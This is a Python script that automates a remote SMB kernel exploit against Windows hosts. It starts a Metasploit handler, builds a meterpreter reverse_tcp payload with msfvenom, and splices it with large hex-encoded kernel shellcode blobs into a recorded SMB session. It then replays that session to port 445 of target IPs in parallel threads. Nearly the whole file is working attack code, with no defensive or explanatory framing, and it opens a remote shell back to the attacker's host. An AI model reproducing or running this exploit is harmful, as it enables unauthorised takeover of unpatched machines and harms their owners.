# -*- coding: utf-8 -*-

import socket
import time
import ast
import subprocess
import binascii
import threading
from metasploit.msfrpc import MsfRpcClient

# start msfrpcd service: msfrpcd -P ${password} -t 3000 -a 0.0.0.0 -S

msf_host = '192.168.1.1'
msf_pass = 'password'

client = MsfRpcClient(msf_pass, server=msf_host, ssl=False)


def start_handler(host, port, payload):
    # start handler
    exp = client.modules.use('exploit', 'multi/handler')
    exp.runoptions['LHOST'] = host
    exp.runoptions['LPORT'] = port
    exp.execute(payload=payload)


def generate_payload(host, port, payload):
    # generate payload by msfvenom
    if host:
        msf_payloads = subprocess.check_output('msfvenom -p {0} LHOST={1} LPORT={2} -f hex'.format(payload, host, port),
                                               shell=True)
        return msf_payloads


def to_bytes(n, length, end='little'):
    # to_bytes based on https://stackoverflow.com/questions/16022556/has-python-3-to-bytes-been-back-ported-to-python-2-7
    h = '%x' % n
    s = ('0' * (len(h) % 2) + h).zfill(length * 2).decode('hex')
    return s if end == 'little' else s[::-1]


def generate_replay(payload, ip):
    original = '31c040907408e809000000c22400e8a7000000c3e801000000eb905bb9760100000f32a3fcffdfff8d431731d20f30c3b923' \
               '0000006a300fa18ed98ec1648b0d400000008b6104ff35fcffdfff609c6a23529c6a0283c2089d804c2401026a1bff350403' \
               'dfff6a0055535657648b1d1c0000006a3b8bb324010000ff3331c04889038b6e286a0183ec4881ed9c020000a1fcffdfffb9' \
               '7601000031d20f30fbe811000000fa648b0d400000008b610483ec289d61c3e9ef000000b9820000c00f3248bbf80fd0ffff' \
               'ffffff8953048903488d050a0000004889c248c1ea200f30c30f01f865488924251000000065488b2425a801000050535152' \
               '565755415041514152415341544155415641576a2b65ff34251000000041536a33514c89d14883ec08554881ec5801000048' \
               '8dac248000000048899dc00000004889bdc80000004889b5d000000048a1f80fd0ffffffffff4889c248c1ea204831dbffcb' \
               '4821d84831c9b9820000c00f30fbe838000000fa65488b2425a80100004883ec78415f415e415d415c415b415a415941585d' \
               '5f5e5a595b5865488b2425100000000f01f8ff2425f80fd0ff31c040900f84b5050000e800000000586089c389e583ec4864' \
               '8b0d38000000668b4106c1e010668b01662500f08b086681f94d5a74072d00100000ebf08945fc5389c3b9940169e3e83e01' \
               '00008945f8b9855483f0e8310100008945f4b92e5b51d2e8240100008945ec5b8d55e831c9890a526a00526a0bffd08b55e8' \
               '85d20f8402010000526a00ff55f885c00f84f4000000506a00ff75e8506a0bff55ec85c00f85e000000058502dfc00000005' \
               '1c01000050e880010000b9fa3cadc239c8741eb91abd4b2b39c87415588b55e881ea1c0100000f8cac0000008955e8ebce58' \
               '8b70ecff55f489f05050682e6461746a61e82702000085c00f84880000005883e940e85a02000085c074158b16c1ea1889f0' \
               'c1e81839d075078b464885c0740a83c60483e904e35eebd88975f05668f80f00006a00ff55f885c0744a5089c731c089c166' \
               '81c10004f3ab5889008b550489500431d78b55f889500831d78b55f489500c31d78b55f089501031d789782483c04889c78d' \
               'b396030000b91a020000f3a45b89433889ec61c3535251575589e583ec1889cf89d88945fce87a00000085c0746d8945f8e8' \
               'ee0000008945f48b45fc8b4df8e80e01000085c074538945f08b45fc8b4df8e80401000085c074418945ec8b45fc8b4df8e8' \
               'fa00000085c0742f8945e88b45fc89f98b55ec8b5df4e8ab00000085c0741889c18b45e8e8dd0000006689c28b45fc8b4df0' \
               'e8d700000083c4185d5f595a5bc35689c683c63c8b3601c666813e5045750983c6788b3601f05ec331c0ebfa56515789c631' \
               'c089c7c1e70729c789f831c98a0e80f900740501c846ebe95f595ec356575289c631c089c7c1e70729c789f831d28a1601d0' \
               '46e2ee5a5f5ec356515789c631c089c7c1e70729c789f831c98a0e80f90074c601c84646ebe85f595ec383c0188b00c35756' \
               '5131ff89c639df74198b04ba01f0e883ffffff39c8740747ebeb595e5fc389f8ebf831c0ebf483c11c8b0901c8c383c1208b' \
               '0901c8c383c1248b0901c8c3d1e101c8668b00c381e2ffff0000c1e20201d18b0901c8c352568b74240c8b4c241031d2d1e9' \
               '85c9740cc1c205ac460c2030c249ebf089d05e5ac20800585a5f5e505689f083c63c8b3601c631c089c1668b4e06668b4614' \
               '01c683c61885c9741d8b0639f875078b460439d0740683c62849ebe98b460c8b4e085e01c6c331f6c36031c083f80f741e31' \
               'c98b3c868b148e39d774034175f30fb694038703000039d1750d40ebdd4139c875056131c040c36131c0c300010203040506' \
               '0708090a09090d0e8b4c240860e8000000005d6681e500f0894d34e8d9010000e843010000e87f01000085c00f84e3000000' \
               '8b5d3c8b4bd8e8170100003c23740d3c77741c3cc87422e9b60000008b4d388b452489410e31c0884112e99f000000e81301' \
               '0000e9b50000008b5d3c8b43e88b303375288b7808337d288b40043345283b431089c3757b8b4d3039f18b452c7418e8f200' \
               '00008d4604506a00ff550885c0746389452c89753001df39f7775329df01c75789f28b753c8b76f089d9f3a45e89d9c1e902' \
               '8b5d28311e83c604e2f901d039c67c288b452c6089e650ffd089f461e8a10000008b4524d1e831c988c101e98b0931c88945' \
               '24e868000000b010eb08b020eb04b030eb008b4d38b4006601411e8b45108944241c61ff603c8d45488b4d0c898847010000' \
               '89a83e01000066b810008b4d386601411e8b45108944241c6168000000008b403c506800000000c331c088c8c1e90800c8c1' \
               'e90800c8c1e90800c8c3518b452489c10fc9d1e031c889452859c360e80b0000008b45108b483c89483861c3608b5d2c85db' \
               '740d31c089df8b4d30f3aa53ff550c31c089453089452c61c357525689cf8b55448b0ae83900000085c0750e83c2088b0ae8' \
               '2b00000085c07421894d446a0c588d71543b06740783c6043b06750d3b4604750889753c31c040eb0231c05e5a5fc331c039' \
               'c17d0140c3525131d2668b510201ca3b11740583c104ebf75a8d411c83c00724f88945448b41f889453889d15ac353555756' \
               '41544155415641574889e54881ec800000006683e4f0e883030000488945f84889c3b92e5b51d2e8ee0100004885c00f84d5' \
               '0100004889c6b9940169e3e8d80100004885c00f84bf010000488945f04889c7b9855483f0e8be0100004885c00f84a50100' \
               '00488945e84c8d4dd04d31c04c89c1448945d04c89c2b10bffd6448b45d04585c00f847f0100008b55d04831c9ffd74885c0' \
               '0f846e0100004889c34831c94989c9448b45d04889c2b10bffd64885c00f85510100004889d8482df8000000480528010000' \
               '8b55d081ea280100000f8c330100008955d050e83f0200004889c258b9fa3cadc24839ca740ab91abd4b2b4839ca75ca488b' \
               '70e84889d9ff55e84889f04831d24889c38b503c4801d04889c64831c94889ca668b4806668b50144801d64883c61848bf2e' \
               '646174610000004883f9000f84cd000000488b064839f874094883c62848ffc9ebe58b460c8b4e084801c648bbfefefefefe' \
               'fefefe4883e9084883f9000f8c9b000000488b3e4839df750c4c8b86980000004d85c074064883c608ebd84883c608488975' \
               'e04831c9baf00f0000ff55f04885c074694989c14831c0b9000400004c89cff3ab4c89cf4883c760488d35910200004831c9' \
               '66b93602f3a44d8909488b5df8498959084831df488b5df0498959104831df488b5de8498959184831df488b5de049895920' \
               '4831df41897944488b45e04883c0704983c1604c890848'
			   
    kernel = 'b9820000c00f3248bbf80fd0ffffffffff8953048903488d050a0000004889c248c1ea200f30c30f01f8654889242510000000' \
             '65488b2425a801000050535152565755415041514152415341544155415641576a2b65ff34251000000041536a33514c89d148' \
             '83ec08554881ec58010000488dac248000000048899dc00000004889bdc80000004889b5d000000048a1f80fd0ffffffffff48' \
             '89c248c1ea204831dbffcb4821d84831c9b9820000c00f30fbe839000000fa65488b2425a80100004883ec78415f415e415d41' \
             '5c415b415a415941585d5f5e5a595b5865488b2425100000000f01f83eff2425f80fd0ff56415741564155415453554889e566' \
             '83e4f04883ec204c8d35e3ffffff654c8b3c25380000004d8b7f0449c1ef0c49c1e70c4981ef00100000498b376681fe4d5a75' \
             'ef41bc2004000031db89d983c10481f9000001000f8d5e0100004c89f289cb41bb6655a24be8b401000085c075db498b0e41bb' \
             'a36f722de8a20100004889c6e8480100004181f9bf771fdd75bc498b1e4d8d6e104c89ea4889d941bbe52411dce8790100006a' \
             '4068001000004d8d4e0849c701001000004d31c04c89f231c948890a48f7d141bb4bca0aee4883ec20e84a010000498b3e488d' \
             '35e900000031c966030dd70100006681c1f900f3a44889de4881c6080300004889f1488b114c29e251524889d14883ec2041bb' \
             '2640369de8090100004883c4205a594885c07418488b80c80200004885c0740c4883c24c8b020fbae0057205488b09ebbe4883' \
             'ea4c4989d431d280c29031c941bb26ac5091e8c80000004889c14c8d898000000041c601c34c89e24989c44d31c041506a0149' \
             '8b065041504883ec2041bbacce554be89800000031d25252415841594c89e141bb1838099ee8820000004c89e941bb22b7b37d' \
             'e8740000004889d941bb0de24d85e8660000004889ec5d5b415c415d415e415f5ec3e9b50000004d31c931c0ac41c1c90d3c61' \
             '7c022c204101c138e075ecc331d265488b5260488b5218488b5220488b12488b7250480fb74a4a4531c931c0ac3c617c022c20' \
             '41c1c90d4101c1e2ee4539d975da4c8b7a20c34c89f8415141505251564889c28b423c4801d08b80880000004801d0508b4818' \
             '448b40204901d048ffc9418b34884801d6e878ffffff4539d975ec58448b40244901d066418b0c48448b401c4901d0418b0488' \
             '4801d05e595a41584159415b4153ffe0564157554889e54883ec2041bbda16af92e84dffffff31c95151515141594c8d051a00' \
             '00005a4883ec2041bb46451b22e868ffffff4889ec5d415f5ec3'

    shellcode = binascii.unhexlify(payload)
    kernel_shellcode = binascii.unhexlify(kernel)
    original_shellcode = binascii.unhexlify(original)
    shellcode_to_send = kernel_shellcode + to_bytes(int(len(shellcode)), 2, 'big') + shellcode
    to_replace = original_shellcode[:len(shellcode_to_send)]
    replay_file = []
    backlog = open("replay.file").read().split("\n\n")
    backlog = [ast.literal_eval(i) for i in backlog]
    for i in backlog:
        if i[0] != 'send':
            replay_file.append(i)
            continue
        j = list(i)
        j[2] = j[2].replace(to_replace, shellcode_to_send)
        replay_file.append(tuple(j))
    replay_name = '{0}.txt'.format(ip)
    open(replay_name, "w").write("\n\n".join([repr(i) for i in replay_file]))
    return replay_name


def get_port(ip):
    # simple way to ensure different ports
    t = int(ip.split(".")[-1])
    return t + 1100


def send_payload(f_name, hostip):
    data = open(f_name).read().split("\n\n")
    data_to_send = [ast.literal_eval(i) for i in data]
    connections = []
    userid = '\x00\x08'
    treeid = '\x00\x08'
    start = time.time()
    for i in data_to_send:
        delta = i[-1] - (start - time.time())
        if delta > 0:
            time.sleep(delta)
        start = time.time()
        if i[0] == "connect":
            sock = socket.socket()
            sock.connect((hostip, 445))
            connections.append({"socket": sock, "stream": i[1]})
        if i[0] == "close":
            [j['socket'].close() for j in connections if j["stream"] == i[1]]
        if i[0] == "send":
            data = i[2].replace("__USERID__PLACEHOLDER__", userid)
            data = data.replace("__TREEID__PLACEHOLDER__", treeid)
            [j['socket'].send(data) for j in connections if j["stream"] == i[1]]
        if i[0] == "recv":
            data = [j['socket'].recv(2048) for j in connections if j['stream'] == i[1]]
            if len(i) > 3:
                if i[2] == "treeid":
                    treeid = data[0][28:30]
                if i[2] == "userid":
                    userid = data[0][32:34]


def exploit(msfip, hostip, shell='windows/meterpreter/reverse_tcp'):
    port = get_port(hostip)
    start_handler(msfip, port, payload=shell)
    payload = generate_payload(msfip, port, payload=shell)
    file_name = generate_replay(payload, hostip)
    send_payload(file_name, hostip)


if __name__ == "__main__":
    ips = ['192.168.80.130']
    for x in ips:
        th = threading.Thread(target=exploit, args=(msf_host, x))
        th.start()
